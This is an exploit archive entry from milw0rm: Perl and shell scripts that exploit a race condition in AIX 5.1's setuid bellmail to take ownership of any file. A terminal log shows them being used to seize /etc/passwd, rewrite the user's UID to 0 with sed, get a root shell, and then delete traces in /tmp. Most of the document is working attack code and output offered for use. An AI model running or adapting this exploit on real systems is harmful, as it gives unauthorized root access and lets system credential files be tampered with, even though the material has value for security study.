-bash-2.05b$
-bash-2.05b$ cat x_aix5_bellmail.pl
#!/usr/bin/perl
# FileName: x_aix5_bellmail.pl
# Exploit "Race condition vulnerability (BUGTRAQ  ID: 8805)" of /usr/bin/bellmail
#         command on Aix5 to change any file owner to current user.
#
#Usage    : x_aix5_bellmail.pl aim_file
#           aim_file : then file wich you want to chown to you.
#    Note : Maybe you should run more than one to "Race condition".
#           The file named "x_bell.sh" can help you to use this exp.
#           You should type "w" "Enter" then "q"  "Enter" key on keyboard
#          as fast as you can when bellmail prompt "?" appear.
#
# Author  : watercloud@xfocus.org
#     XFOCUS Team    
#     http://www.xfocus.net   (CN)
#     http://www.xfocus.org   (EN)
#
# Date    : 2004-6-6
# Tested  : on  Aix5.1.
# Addition: IBM had offered a patch named "IY25661" for it.
# Announce: use as your owner risk!

$CMD="/usr/bin/bellmail";
$MBOX="$ENV{HOME}/mbox";
$TMPFILE="/tmp/.xbellm.tmp";

$AIM_FILE = shift @ARGV ;
$FORK_NUM = 1000;

die "AIM FILE \"$AIM_FILE\" not exist.\n" if ! -e $AIM_FILE;

unlink $MBOX;
system "echo abc > $TMPFILE";
system "$CMD $ENV{LOGIN} < $TMPFILE";
unlink $TMPFILE;

$ret=`ls -l $AIM_FILE"`;
print "Before: $ret";

if( fork()==0 )
{
        &deamon($FORK_NUM);
        exit 0 ;
}
sleep( (rand()*100)%4);
exec $CMD;

$ret=`ls -l $AIM_FILE"`;
print "Now: $ret";

sub deamon {
        $num = shift || 1;
        for($i=0;$i<$num;$i++) {
                &do_real() if fork()==0;
        }
}
sub do_real {
        if(-e $MBOX) {
                unlink $MBOX ;
                symlink "$AIM_FILE",$MBOX;
        }
        exit 0;
}
#EOF







-bash-2.05b$
-bash-2.05b$ cat x_bellmail.sh
#!/bin/sh
#File:x_bellmail.sh
#The assistant of x_aix5_bellmail.pl
#Author : watercloud@xfocus.org
#Date   :2004-6-6
#

X_BELL_PL="./x_aix5_bellmail.pl"
AIM=$1

if [ $# ne 1 ] ;then
        echo "Need a aim file name as argv."
        exit 1;
fi

if [ ! -e "$1" ];then
        echo "$1 not exist!"
        exit 1
fi
if [ ! -x "$X_BELL_PL" ];then
        echo "can not exec $X_BELL_PL"
        exit 1
fi

ret=`ls -l $AIM`
echo $ret; echo
fuser=`echo $ret |awk '{print $3}'`
while [ "$fuser" != "$LOGIN" ]
do
        $X_BELL_PL $AIM
        ret=`ls -l $AIM`
        echo $ret;echo
        fuser=`echo $ret |awk '{print $3}'`
done
echo $ret; echo
#EOF




-bash-2.05b$ id
uid=201(cloud) gid=1(staff)
-bash-2.05b$
-bash-2.05b$ oslevel
5.1.0.0
-bash-2.05b$ oslevel -r
5100-01
-bash-2.05b$ ls -l /usr/bin/bellmail
-r-sr-sr-x   1 root     mail          30208 Aug 09 2003  /usr/bin/bellmail
-bash-2.05b$ ls -l /etc/passwd
-rw-r--r--   1 root     security        570 Jun 03 22:59 /etc/passwd
-bash-2.05b$ cp /etc/passwd /tmp/


-bash-2.05b$ ./x_bellmail.sh /etc/passwd
./x_bellmail.sh[11]: ne: 0403-012 A test command parameter is not valid.
-rw-r--r-- 1 root security 570 Jun 03 22:59 /etc/passwd

Before: -rw-r--r--   1 root     security        570 Jun 03 22:59 /etc/passwd
From cloud Sun Jun  6 08:49:30 2004
abc

? w
From cloud Sun Jun  6 08:25:20 2004
abc

? q
-rw-r--r-- 1 root security 570 Jun 03 22:59 /etc/passwd

Before: -rw-r--r--   1 root     security        570 Jun 03 22:59 /etc/passwd
From cloud Sun Jun  6 08:49:35 2004
abc

? w
From cloud Sun Jun  6 08:25:20 2004
abc

? q
-rw-r--r-- 1 root security 570 Jun 03 22:59 /etc/passwd

Before: -rw-r--r--   1 root     security        570 Jun 03 22:59 /etc/passwd
From cloud Sun Jun  6 08:49:40 2004
abc

? w
From cloud Sun Jun  6 08:25:20 2004
abc

? q
-rw-r--r-- 1 root security 570 Jun 03 22:59 /etc/passwd

Before: -rw-r--r--   1 root     security        570 Jun 03 22:59 /etc/passwd
From cloud Sun Jun  6 08:49:43 2004
abc

? w
From cloud Sun Jun  6 08:25:20 2004
abc

? q
-rw-r--r-- 1 root security 570 Jun 03 22:59 /etc/passwd

Before: -rw-r--r--   1 root     security        570 Jun 03 22:59 /etc/passwd
w
From cloud Sun Jun  6 08:49:48 2004
abc

? From cloud Sun Jun  6 08:25:20 2004
abc

? w
bellmail: cannot append to /home/cloud/mbox
? w
bellmail: cannot append to /home/cloud/mbox
? q
-rw-r--r-- 1 root security 570 Jun 03 22:59 /etc/passwd

Before: -rw-r--r--   1 root     security        570 Jun 03 22:59 /etc/passwd
From cloud Sun Jun  6 08:49:56 2004
abc

? w
From cloud Sun Jun  6 08:25:20 2004
abc

? q
-rw-r--r-- 1 root security 570 Jun 03 22:59 /etc/passwd

Before: -rw-r--r--   1 root     security        570 Jun 03 22:59 /etc/passwd
From cloud Sun Jun  6 08:50:01 2004
abc

? w
From cloud Sun Jun  6 08:25:20 2004
abc

? q
-rw-r--r-- 1 cloud staff 570 Jun 03 22:59 /etc/passwd

-rw-r--r-- 1 cloud staff 570 Jun 03 22:59 /etc/passwd






-bash-2.05b$ cat /etc/passwd
root:!:0:0::/:/usr/bin/ksh
daemon:!:1:1::/etc:
bin:!:2:2::/bin:
sys:!:3:3::/usr/sys:
adm:!:4:4::/var/adm:
uucp:!:5:5::/usr/lib/uucp:
guest:!:100:100::/home/guest:
nobody:!:4294967294:4294967294::/:
lpd:!:9:4294967294::/:
lp:*:11:11::/var/spool/lp:/bin/false
invscout:*:200:1::/var/adm/invscout:/usr/bin/ksh
nuucp:*:6:5:uucp login user:/var/spool/uucppublic:/usr/sbin/uucp/uucico
snapp:*:177:1:snapp login user:/usr/sbin/snapp:/usr/sbin/snappd
imnadm:*:188:188::/home/imnadm:/usr/bin/ksh
cloud:!:201:1::/home/cloud:/usr/local/bin/bash



-bash-2.05b$ cat /tmp/passwd |sed 's/cloud:!:201:/cloud:!:0:/' >/etc/passwd


-bash-2.05b$ su cloud
cloud's Password:
3004-502 Cannot get "LOGNAME" variable.
-bash-2.05b$ id
uid=201 gid=1(staff)
-bash-2.05b$ ls -l /etc/passwd
-rw-r--r--   1 201      staff           568 Jun 06 08:56 /etc/passwd
-bash-2.05b$ echo 'test:!:201:1::/home/cloud:/usr/local/bin/bash'  >> /etc/passwd
-bash-2.05b$ cat /etc/passwd
root:!:0:0::/:/usr/bin/ksh
daemon:!:1:1::/etc:
bin:!:2:2::/bin:
sys:!:3:3::/usr/sys:
adm:!:4:4::/var/adm:
uucp:!:5:5::/usr/lib/uucp:
guest:!:100:100::/home/guest:
nobody:!:4294967294:4294967294::/:
lpd:!:9:4294967294::/:
lp:*:11:11::/var/spool/lp:/bin/false
invscout:*:200:1::/var/adm/invscout:/usr/bin/ksh
nuucp:*:6:5:uucp login user:/var/spool/uucppublic:/usr/sbin/uucp/uucico
snapp:*:177:1:snapp login user:/usr/sbin/snapp:/usr/sbin/snappd
imnadm:*:188:188::/home/imnadm:/usr/bin/ksh
cloud:!:0:1::/home/cloud:/usr/local/bin/bash
test:!:201:1::/home/cloud:/usr/local/bin/bash


-bash-2.05b$ su cloud
cloud's Password:
bash-2.05b# id
uid=0(root) gid=1(staff)
bash-2.05b# ls -l /etc/passwd
-rw-r--r--   1 test     staff           614 Jun 06 08:58 /etc/passwd
bash-2.05b# cp /tmp/passwd /etc/passwd
bash-2.05b# chown root /tmp/passwd
bash-2.05b# ls -l /tmp/passwd
-rw-r--r--   1 root     staff           570 Jun 06 08:48 /tmp/passwd
bash-2.05b# id
uid=0(root) gid=1(staff)
bash-2.05b#
bash-2.05b# rm /tmp/.bel*
bash-2.05b# rm /tmp/passwd
bash-2.05b#


# milw0rm.com [2005-05-19]